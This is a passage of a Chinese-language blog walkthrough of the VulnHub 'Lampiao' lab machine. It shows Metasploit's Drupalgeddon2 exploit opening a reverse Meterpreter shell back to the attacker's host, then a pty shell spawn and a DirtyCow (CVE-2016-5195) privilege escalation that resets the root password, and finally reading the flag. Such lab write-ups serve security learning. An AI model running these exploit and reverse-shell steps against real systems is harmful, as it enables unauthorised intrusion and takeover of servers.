+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> lhost 192.168.2.4<br>lhost =&gt; 192.168.2.4<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rhost 192.168.2.10<br>rhost =&gt; 192.168.2.10<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; <span class="hljs-built_in">set</span> rport 1898<br>rport =&gt; 1898<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show option<br>sf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.2.4:4444 <br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target is vulnerable.<br>[*] Sending stage (39927 bytes) to 192.168.2.10<br>[*] Meterpreter session 1 opened (192.168.2.4:4444 -&gt; 192.168.2.10:45742) at 2025-02-08 11:20:51 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>（4）输入<code>shell</code>，成功进行连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 4974 created.<br>Channel 0 created.<br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+<p>（5）获取稳定的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <br></code></pre></td></tr></table></figure>
+<h1 id="提权-dirtycow"><a href="#提权-dirtycow" class="headerlink" title="提权-dirtycow"></a>提权-dirtycow</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>进行提权，将脚本上传至临时目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/lampiao/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+<p>（2）进行命令交互界面，给脚本添加执行权限，并执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 5651 created.<br>Channel 2 created.<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>www-data@lampiao:/var/www/html$ <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www-data@lampiao:/tmp$ <span class="hljs-built_in">chmod</span> +x 1.sh    <br><span class="hljs-built_in">chmod</span> +x 1.sh<br>www-data@lampiao:/tmp$ ./1.sh<br>./1.sh<br></code></pre></td></tr></table></figure>
+<p>（3）根据执行的结果，选择相关的漏洞进行利用（一般选择有颜色的进行利用）<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502081139012.png" srcset="/img/loading.gif" lazyload><br>（4）选择<code>CVE-2016-5195</code>进行利用</p>
+<ul>
+<li>利用脚本：<a target="_blank" rel="noopener" href="https://github.com/gbonacini/CVE-2016-5195%EF%BC%8C%E5%B0%86%E8%84%9A%E6%9C%AC%E4%B8%8A%E4%BC%A0%E8%87%B3%E7%9B%AE%E5%BD%95/tmp">https://github.com/gbonacini/CVE-2016-5195，将脚本上传至目录/tmp</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload /miao/vulnhub/lampiao/CVE-2016-5195-master/ /tmp/<br><br></code></pre></td></tr></table></figure></li>
+<li>对<code>dcow.cpp</code>进行编译<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil<br></code></pre></td></tr></table></figure>
+（5）执行<code>dcow</code>，对密码进行重置<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ ./dcow<br>./dcow<br>Running ...<br>Received su prompt (Password: )<br>Root password is:   dirtyCowFun<br>Enjoy! :-)<br></code></pre></td></tr></table></figure>
+（6）切换到<code>root</code>用户<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@lampiao:/tmp$ su root<br>su root<br>Password: dirtyCowFun<br><br>root@lampiao:/tmp#<br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>读取flag</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@lampiao:~# <span class="hljs-built_in">cat</span> /root/flag.txt<br><span class="hljs-built_in">cat</span> /root/flag.txt<br>9740616875908d91ddcdaa8aea3af366<br></code></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要是对CMS，drupal的漏洞进行利用以及如何使用msf<br>（2）dirtrydcow提权的方法，主要是对root的密码进行重置<br>（3）使用python获取稳定的shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/drupal/" class="print-no-link">#drupal</a>
+      
+        <a href="/tags/%E6%8F%90%E6%9D%83-dirtycow/" class="print-no-link">#提权-dirtycow</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Lampiao</div>
+      <div>http://miao-sec.github.io/vulnhub/Lampiao/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/vulnhub/Hackathon/" title="Hackathon">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Hackathon</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/vulnhub/Jarbas/" title="Jarbas">
+                        <span class="hidden-mobile">Jarbas</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
